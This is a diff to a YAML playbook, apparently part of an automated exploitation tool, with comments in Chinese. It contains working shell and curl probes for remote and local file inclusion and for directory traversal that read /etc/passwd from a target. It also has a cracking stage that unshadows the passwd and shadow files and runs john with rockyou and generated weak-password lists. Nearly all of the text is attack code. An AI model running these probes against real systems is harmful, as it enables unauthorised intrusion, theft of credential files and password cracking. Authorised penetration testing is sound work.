@@ -398,11 +398,17 @@ probes:
         local ec=$?
         local sz=${#result}
 
-        # 检测 1: 如果返回内容包含远程资源特征，说明远真包含成功
-        if echo "$result" | grep -qiE '(Example Domain|httpbin|json|User-Agent)'; then
+        # 检测 1: 响应体包含回调标记（callback marker）或远程资源特征
+        if echo "$result" | grep -qiE '(RFI_CHECK|Remote Include OK|callback_ok)'; then
           echo "[RFI-$PROBE_COUNT][HIT] $label exit=$ec size=${sz}B"
           echo "    URL: $url"
-          echo "    Response contains remote content markers"
+          echo "    Response contains callback marker — RFI confirmed"
+          return 0
+        fi
+        # 如果响应非空且不包含 PHP 文件未找到错误，且大小明显不同于应用正常响应
+        if [ "$sz" -gt 200 ] && ! echo "$result" | grep -qiE '(failed to open stream|No such file|Warning.*include)'; then
+          echo "[RFI-$PROBE_COUNT][HIT] $label exit=$ec size=${sz}B (remote-like response)"
+          echo "    URL: $url"
           return 0
         fi
 
@@ -428,38 +434,45 @@ probes:
 
       # Layer 1: 标准 HTTP RFI 测试
       echo "--- RFI Layer 1: HTTP remote inclusion ---"
-      RFI_URLS="http://example.com/ http://httpbin.org/get http://1.1.1.1/"
+      RFI_CALLBACK="{rfi_callback_url}"
+      if [ "$RFI_CALLBACK" = "{rfi_callback_url}" ] || [ -z "$RFI_CALLBACK" ]; then
+        RFI_CALLBACK="http://127.0.0.1:8080/rfi_ping"
+        echo "[INFO] 未配置 rfi_callback_url，使用 localhost 回环测试: $RFI_CALLBACK"
+      fi
       for mount in "/" "$ENDPOINT_PATH"; do
         [ -z "$mount" ] || [ "$mount" = "/" ] && continue
         for param in $COMMON_PARAMS; do
-          for rfi_url in $RFI_URLS; do
-            if [ "$mount" = "/" ]; then
-              URL="$BASE/?$param=$rfi_url"
-            else
-              URL="$BASE${mount}\?$param=$rfi_url"
-            fi
-            if try_rfi "$URL" "HTTP mount=$mount param=$param url=$rfi_url"; then
-              echo "RFI_FOUND:$param:http"
-              exit 0
-            fi
-          done
+          if [ "$mount" = "/" ]; then
+            URL="$BASE/?$param=$RFI_CALLBACK"
+          else
+            URL="$BASE${mount}\?$param=$RFI_CALLBACK"
+          fi
+          if try_rfi "$URL" "HTTP mount=$mount param=$param"; then
+            echo "RFI_FOUND:$param:http"
+            exit 0
+          fi
         done
       done
 
       # Layer 2: HTTPS 测试
       echo "--- RFI Layer 2: HTTPS remote inclusion ---"
+      RFI_CALLBACK_HTTPS="{rfi_callback_url_https}"
+      if [ "$RFI_CALLBACK_HTTPS" = "{rfi_callback_url_https}" ] || [ -z "$RFI_CALLBACK_HTTPS" ]; then
+        RFI_CALLBACK_HTTPS="$RFI_CALLBACK"
+        echo "$RFI_CALLBACK_HTTPS" | grep -q '^https://' || RFI_CALLBACK_HTTPS="https://127.0.0.1:8443/rfi_ping"
+      fi
       for param in $COMMON_PARAMS; do
-        URL="$BASE/?$param=https://example.com/"
+        URL="$BASE/?$param=$RFI_CALLBACK_HTTPS"
         if try_rfi "$URL" "HTTPS param=$param"; then
           echo "RFI_FOUND:$param:https"
           exit 0
         fi
       done
 
-      # Layer 3: FTP/data 等其他协议探测
+      # Layer 3: FTP 等其他协议探测
       echo "--- RFI Layer 3: Alternative protocols ---"
       for param in page file include; do
-        URL="$BASE/?$param=ftp://ftp.gnu.org/"
+        URL="$BASE/?$param=ftp://127.0.0.1:21/"
         if try_rfi "$URL" "FTP param=$param"; then
           echo "RFI_FOUND:$param:ftp"
           exit 0
@@ -598,7 +611,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include path image content template"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include path image content template"
           fi
@@ -637,7 +650,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include path image content template"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include path image content template"
           fi
@@ -668,7 +681,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include path"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include path"
           fi
@@ -701,7 +714,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include"
           fi
@@ -739,7 +752,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include path"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include path"
           fi
@@ -924,19 +937,40 @@ exploit_paths:
           unshadow "$PASSWD_FILE" "$SHADOW_FILE" > "$UNSHADOW_FILE" 2>/dev/null || \
             cp "$SHADOW_FILE" "$UNSHADOW_FILE"
 
-          # Phase 1: 快速字典检测（top5000, <15s, 不阻塞主流程）
+          # Phase 1: 快速字典检测（<15s, 不阻塞主流程）
+          WORDLIST_BASE="{wordlist_base_dir}"
+          [ "$WORDLIST_BASE" = "{wordlist_base_dir}" ] && WORDLIST_BASE=""
           WORDLIST_FAST=""
           for candidate in \
+            "${WORDLIST_BASE}/rockyou-top5000.txt" \
+            "${WORDLIST_BASE}/fasttrack.txt" \
+            "${WORDLIST_BASE}/rockyou.txt" \
             "/usr/share/wordlists/rockyou-top5000.txt" \
             "/usr/share/wordlists/fasttrack.txt" \
-            "/usr/share/wordlists/rockyou.txt"; do
-            [ -f "$candidate" ] && { WORDLIST_FAST="$candidate"; break; }
+            "/usr/share/wordlists/rockyou.txt" \
+            "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt" \
+            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" \
+            "/opt/wordlists/rockyou.txt"; do
+            [ -n "$candidate" ] && [ -f "$candidate" ] && { WORDLIST_FAST="$candidate"; break; }
           done
           if [ -z "$WORDLIST_FAST" ]; then
-            echo "[WARN] 未找到快速字典，回退到 top100 常见弱密码"
-            echo -e "admin\npassword\n123456\nroot\ntoor\nadmin123\nletmein\nqwerty\nsecret\npassw0rd" > /tmp/fastpass_$$
-            WORDLIST_FAST="/tmp/fastpass_$$"
-            CUSTOM_TMP=1
+            WEAKPASS="{weakpass_list}"
+            if [ "$WEAKPASS" != "{weakpass_list}" ] && [ -n "$WEAKPASS" ]; then
+              echo "$WEAKPASS" | tr ',' '\n' > /tmp/fastpass_$$
+              WORDLIST_FAST="/tmp/fastpass_$$"
+              CUSTOM_TMP=1
+              echo "[INFO] 使用配置的弱密码列表"
+            else
+              echo "[WARN] 未找到快速字典，使用通用弱密码模式生成"
+              for base in admin root test user guest; do
+                echo "$base"
+                echo "${base}123"
+                echo "${base}123456"
+              done > /tmp/fastpass_$$
+              echo -e "password\n123456\nqwerty\nletmein\nchangeme\nwelcome" >> /tmp/fastpass_$$
+              WORDLIST_FAST="/tmp/fastpass_$$"
+              CUSTOM_TMP=1
+            fi
           fi
 
           echo "[CRACK-P1] john --wordlist=$WORDLIST_FAST (快速检测, ~10s) ..."
@@ -984,7 +1018,7 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: read_passwd_confirm
-        description: "验证目录遍历 — 使用已确认参数和深度/风格读取 /etc/passwd"
+        description: "验证目录遍历 — 使用已确认参数和深度/风格读取 /etc/passwd（不再遍历无关参数）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
 
@@ -995,39 +1029,37 @@ exploit_paths:
           [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
           [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH=""
           [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
-          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE="relative"
+          [ "$LFI_STYLE" = "{lfi_style}" ] && LFI_STYLE=""
 
-          build_url() {
-            local target_file="$1"
-            local d="$2"
+          # 快速校验已确认的参数与风格（不再遍历其他参数）
+          if [ -n "$LFI_PARAM" ] && [ -n "$LFI_STYLE" ]; then
+            echo "[INFO] 使用已确认参数 $LFI_PARAM (风格=$LFI_STYLE)，跳过参数遍历"
             if [ "$LFI_STYLE" = "absolute" ]; then
-              if [ -n "$LFI_PATH" ]; then
-                echo "$BASE${LFI_PATH}/${target_file}"
-              else
-                echo "$BASE/?$LFI_PARAM=/${target_file}"
+              URL="$BASE/?$LFI_PARAM=/etc/passwd"
+              echo "[PROBE-ABS-CONFIRMED] $URL"
+              result=$(curl -s "$URL" --max-time 6 2>/dev/null)
+              if echo "$result" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
+                echo "[HIT] LFI_PASSWD_OK:$LFI_PARAM:0:absolute"
+                echo "$result"
+                exit 0
               fi
             else
-              local TRAV
-              TRAV=$(printf '../%.0s' $(seq 1 $d))
-              if [ -n "$LFI_PATH" ]; then
-                echo "$BASE${LFI_PATH}${TRAV}${target_file}"
-              else
-                echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+              [ -z "$LFI_DEPTH" ] && LFI_DEPTH="5"
+              TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+              URL="$BASE/?$LFI_PARAM=${TRAV}etc/passwd"
+              echo "[PROBE-REL-CONFIRMED] $URL (depth=$LFI_DEPTH)"
+              result=$(curl -s "$URL" --max-time 6 2>/dev/null)
+              if echo "$result" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
+                echo "[HIT] LFI_PASSWD_OK:$LFI_PARAM:$LFI_DEPTH"
+                echo "$result"
+                exit 0
               fi
             fi
-          }
-
-          if [ -n "$LFI_DEPTH" ] && { [ -n "$LFI_PATH" ] || [ -n "$LFI_PARAM" ]; }; then
-            URL=$(build_url "etc/passwd" "$LFI_DEPTH")
-            echo "[PROBE] $URL (param=$LFI_PARAM path=$LFI_PATH depth=$LFI_DEPTH style=$LFI_STYLE)"
-            result=$(curl -s "$URL" --max-time 6 2>/dev/null)
-            if echo "$result" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
-              echo "[HIT] LFI_PASSWD_OK"
-              echo "$result"
-              exit 0
-            fi
+            echo "[WARN] 已确认参数 $LFI_PARAM 验证失败，回退到全参数探测"
           fi
 
+          # 回退：全参数探测（仅当无已确认参数或确认参数失败时）
+          echo "[INFO] 全参数探测模式"
           for param in page file include path image content template; do
             URL="$BASE/?$param=/etc/passwd"
             echo "[PROBE-ABS] $URL"
@@ -1041,8 +1073,8 @@ exploit_paths:
 
           for depth in 1 2 3 4 5 6 7 8 9 10; do
             for param in page file include path image content template; do
-              LFI_PARAM="$param"
-              URL=$(build_url "etc/passwd" "$depth")
+              TRAV=$(printf '../%.0s' $(seq 1 $depth))
+              URL="$BASE/?$param=${TRAV}etc/passwd"
               echo "[PROBE] $URL"
               result=$(curl -s "$URL" --max-time 6 2>/dev/null)
               if echo "$result" | grep -qE '^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)'; then
@@ -1200,7 +1232,7 @@ exploit_paths:
           CONFIRMED="{lfi_param}"
           [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
           if [ -n "$CONFIRMED" ]; then
-            PARAMS="$CONFIRMED page file include path image content template"
+            PARAMS="$CONFIRMED"
           else
             PARAMS="page file include path image content template"
           fi
